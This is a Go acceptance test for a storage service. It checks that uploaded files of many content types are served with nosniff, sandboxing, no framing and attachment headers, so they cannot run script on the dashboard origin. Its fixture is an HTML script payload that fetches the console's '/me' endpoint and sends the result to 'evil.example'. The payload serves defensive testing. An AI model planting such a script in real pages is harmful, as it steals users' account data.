package acceptance

import (
	"io"
	"net/http"
	"net/url"
	"strings"
	"testing"

	storage "github.com/arumadev/aruma/internal/services/storage/core"
)

// Hardening: Storage serves bytes a project's users chose, from the same origin as the dashboard
// and the console API. Whatever the stored content type, a browser that navigates to an object
// must not run it with the origin's rights: nosniff, a sandbox policy without allow-scripts,
// no framing, and the stored type served as stored. The dashboard's own download is always an
// attachment.
func TestHardStoredFilesCannotRunOnTheDashboardOrigin(t *testing.T) {
	h := newHardEnv(t, nil)
	p := h.b
	h.open(p, "bravo-secret")
	bucket, err := h.App.Storage.Bucket(t.Context(), p.bucket)
	if err != nil {
		t.Fatal(err)
	}
	active := []string{"text/html", "TEXT/HTML", "text/html; charset=utf-7", " text/html", "application/xhtml+xml", "image/svg+xml",
		"text/xml", "application/xml", "text/javascript", "application/javascript", "application/ecmascript", "text/ecmascript",
		"application/json", "text/css", "application/pdf", "multipart/x-mixed-replace; boundary=x", "application/wasm",
		"text/cache-manifest", "application/mathml+xml", "text/plain", "application/octet-stream", "text/html,text/plain", "image/png",
		"application/x-shockwave-flash", "text/x-component", "application/xslt+xml", "text/vtt", "message/rfc822", "text/rtf"}
	body := `<html><script>fetch('/console/v1/me').then(r=>r.text()).then(t=>location='//evil.example/?'+t)</script></html>`
	for i, ct := range active {
		name := "files/x" + itoa(i)
		spec := storage.UploadSpec{Name: name, Declared: int64(len(body)), Surface: storage.SurfaceFirebase,
			Attrs: storage.Patch{Fields: map[string]*string{storage.FieldContentType: &ct}}}
		o, err := h.App.Storage.Insert(t.Context(), bucket, storage.Principal{Kind: storage.PrincipalAdmin}, spec, strings.NewReader(body), int64(len(body)))
		if err != nil {
			t.Logf("content type %q is refused at upload: %v", ct, err)
			continue
		}
		type reply struct {
			via    string
			status int
			h      http.Header
			body   string
		}
		get := func(via, path string, hdr map[string]string) reply {
			req, _ := http.NewRequest("GET", h.URL+path, nil)
			for k, v := range hdr {
				req.Header.Set(k, v)
			}
			if via == "console download" {
				for _, ck := range p.owner.cookies {
					req.AddCookie(ck)
				}
			}
			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				t.Fatal(err)
			}
			defer resp.Body.Close()
			b, _ := io.ReadAll(resp.Body)
			return reply{via, resp.StatusCode, resp.Header, string(b)}
		}
		obj := "/v0/b/" + p.bucket + "/o/" + url.PathEscape(name)
		replies := []reply{
			get("v0 token", obj+"?alt=media&token="+o.DownloadTokens[0], nil),
			get("v0 admin bearer", obj+"?alt=media", map[string]string{"Authorization": "Bearer " + p.sat}),
			get("v0 user", obj+"?alt=media", map[string]string{"Authorization": "Firebase " + p.idToken}),
			get("gcs media", "/storage/v1/b/"+p.bucket+"/o/"+url.PathEscape(name)+"?alt=media", map[string]string{"Authorization": "Bearer " + p.sat}),
			get("console download", "/console/v1/projects/"+p.id+"/storage/object:download?name="+url.QueryEscape(name), nil),
		}
		for _, r := range replies {
			if r.status != 200 {
				t.Errorf("%q via %s: %d %.80s", ct, r.via, r.status, r.body)
				continue
			}
			csp := r.h.Get("Content-Security-Policy")
			switch {
			case r.h.Get("X-Content-Type-Options") != "nosniff":
				t.Errorf("%q via %s: no nosniff", ct, r.via)
			case !strings.Contains(csp, "sandbox") || strings.Contains(csp, "allow-scripts") || strings.Contains(csp, "allow-same-origin"):
				t.Errorf("%q via %s: policy %q does not sandbox", ct, r.via, csp)
			case r.h.Get("X-Frame-Options") != "DENY":
				t.Errorf("%q via %s: framable: %q", ct, r.via, r.h.Get("X-Frame-Options"))
			case len(r.h.Values("Content-Type")) != 1 || strings.ContainsAny(r.h.Get("Content-Type"), "\r\n,"):
				t.Errorf("%q via %s: Content-Type %q", ct, r.via, r.h.Values("Content-Type"))
			case r.via == "console download" && !strings.HasPrefix(r.h.Get("Content-Disposition"), "attachment"):
				t.Errorf("%q via %s: Content-Disposition %q", ct, r.via, r.h.Get("Content-Disposition"))
			case r.h.Get("Content-Type") != "" && strings.EqualFold(strings.TrimSpace(strings.SplitN(r.h.Get("Content-Type"), ";", 2)[0]), "application/pdf") && !strings.HasPrefix(r.h.Get("Content-Disposition"), "attachment"):
				t.Errorf("%q via %s: a PDF is not an attachment: %q", ct, r.via, r.h.Get("Content-Disposition"))
			}
			if r.h.Get("Set-Cookie") != "" {
				t.Errorf("%q via %s: sets a cookie", ct, r.via)
			}
		}
	}
	// A script, style or worker load of an object from the dashboard's own origin is refused, and so is any service worker script.
	o, err := h.App.Storage.Insert(t.Context(), bucket, storage.Principal{Kind: storage.PrincipalAdmin},
		storage.UploadSpec{Name: "files/app.js", Declared: 3, Surface: storage.SurfaceFirebase, Attrs: storage.Patch{Fields: map[string]*string{storage.FieldContentType: new("text/javascript")}}},
		strings.NewReader("1;1"), 3)
	if err != nil {
		t.Fatal(err)
	}
	for _, hdr := range []map[string]string{
		{"Sec-Fetch-Dest": "script", "Sec-Fetch-Site": "same-origin"},
		{"Sec-Fetch-Dest": "style", "Sec-Fetch-Site": "same-origin"},
		{"Sec-Fetch-Dest": "worker", "Sec-Fetch-Site": "cross-site"},
		{"Sec-Fetch-Dest": "serviceworker", "Sec-Fetch-Site": "same-origin"},
		{"Service-Worker": "script"},
	} {
		req, _ := http.NewRequest("GET", h.URL+"/v0/b/"+p.bucket+"/o/files%2Fapp.js?alt=media&token="+o.DownloadTokens[0], nil)
		for k, v := range hdr {
			req.Header.Set(k, v)
		}
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		resp.Body.Close()
		if resp.StatusCode != 403 {
			t.Errorf("a load with %v was served: %d", hdr, resp.StatusCode)
		}
	}
}
